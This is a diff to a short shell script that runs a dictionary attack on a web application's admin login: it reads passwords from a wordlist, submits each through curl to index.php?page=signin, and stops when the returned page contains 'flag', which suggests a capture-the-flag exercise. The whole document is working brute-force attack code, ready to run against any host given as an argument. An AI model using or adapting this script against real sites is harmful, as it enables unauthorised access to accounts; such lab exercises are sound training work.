@@ -7,8 +7,13 @@ then
 fi
 
 for password in $(cat dictionnary); do
-    headers=$(curl "http://$1/index.php?page=signin&username=admin&password=${password}&Login=Login#")
-    if grep '200' "$headers" > /dev/null; then
-        echo "$password"
+    echo "... trying with $password"
+    page=$(curl -s "http://$1/index.php?page=signin&username=admin&password=${password}&Login=Login#")
+    if echo $page | grep 'flag' > /dev/null; then
+        echo "the password is $password"
+        exit 0
     fi
 done
+
+echo "could not find the password, sorry !"
+exit 1
